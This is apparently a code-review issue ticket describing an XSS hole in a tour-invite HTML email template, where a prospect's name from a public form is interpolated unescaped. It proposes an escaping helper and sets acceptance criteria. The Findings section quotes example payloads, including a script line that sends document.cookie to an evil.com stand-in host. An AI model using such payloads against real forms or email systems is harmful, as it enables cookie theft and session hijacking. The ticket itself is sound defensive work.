---
status: pending
priority: p1
issue_id: "002"
tags: [security, code-review, xss, email]
---

# XSS via firstName in HTML Email Template

## Problem Statement
`tourInviteHtml()` interpolates `firstName` (derived from `prospectName` in the DB) directly into a raw HTML string without escaping. `prospectName` originates from an unauthenticated public form submission. A crafted value like `<img src=x onerror=alert(1)>` is executed in email clients that render HTML without sandboxing.

## Findings
**File:** `lib/resend/templates/tour-invite.ts`, line 21

```typescript
<h1 style="...">
  We&rsquo;ll see you soon,<br />${firstName}.
</h1>
```

`firstName` = `prospectName.trim().split(/\s+/)[0]` from `actions.ts:406`. The name comes from the `membership_requests` table, written by the public `/contact` form. A payload like `<script>fetch('https://evil.com/'+document.cookie)</script>` or `<a href="javascript:...">` would execute in vulnerable email clients.

OWASP A03 (Injection) — FAIL.

## Proposed Solution
Add a minimal HTML escape helper and apply it to `firstName` before template interpolation:

```typescript
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
}
```

Apply in `tourInviteHtml()` at the interpolation site. The plain-text `tourInviteText()` does not need HTML escaping.

Also consider sanitizing `prospectName` upstream in `scheduleTourAction` (strip HTML tags entirely) so downstream templates never receive raw HTML.

**Effort:** Small | **Risk:** None

## Acceptance Criteria
- [ ] `firstName` containing `<script>` tags renders as literal text in the HTML email, not executable markup
- [ ] `firstName` containing `&`, `<`, `>`, `"`, `'` characters is correctly escaped
- [ ] Plain-text email body is unchanged
